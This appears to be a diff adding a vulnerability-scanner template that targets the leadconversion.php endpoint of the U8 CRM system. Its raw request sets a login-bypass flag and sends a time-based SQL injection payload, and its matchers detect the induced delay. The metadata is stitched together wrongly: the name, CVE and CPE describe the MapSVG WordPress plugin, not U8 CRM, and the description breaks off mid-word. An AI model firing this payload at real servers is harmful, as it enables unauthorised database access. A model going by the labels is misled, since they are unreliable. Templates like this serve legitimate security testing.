@@ -1,0 +1,43 @@
+id: u8-crm-leadconversion-sqli
+
+info:
+  name: MapSVG < 6.2.20 - Unauthenticated SQLi
+  author: DhiyaneshDK
+  severity: critical
+  description: |
+    The T endpoint before using it in a SQL statement, leadi
+  reference:
+    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BU8+CRM%E7%B3%BB%E7%BB%9Fleadconversion.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2022-0592
+    cwe-id: CWE-89
+    epss-score: 0.65191
+    epss-percentile: 0.98402
+    cpe: cpe:2.3:a:mapsvg:mapsvg:*:*:*:*:*:wordpress:*:*
+  tags: u8-crm
+
+http:
+  - raw:
+      - |
+        @timeout: 10s
+        POST /lead/leadconversion.php HTTP/1.1
+        Upgrade-Insecure-Requests: 1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=bgsesstimeout-;
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 75
+
+        DontCheckLogin=1&Action=getDeptName&userid=1%27;WAITFOR+DELAY+%270:0:5%27--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration >= 5'
+          - 'contains(body, "success")'
+          - 'status_code == 200'
+        condition: and
+# digest: 4a0a00473045022100c62b7355a6985be26a6d9cbbe01a09f0546ed477bebbbd817e4ab123221b51a102206f604bccbcbdf9d1f2c8f29b43ef53342152d12d5d93afac426dcd797f7f6b9a:922c64590222798bb761d5b6d8e72950
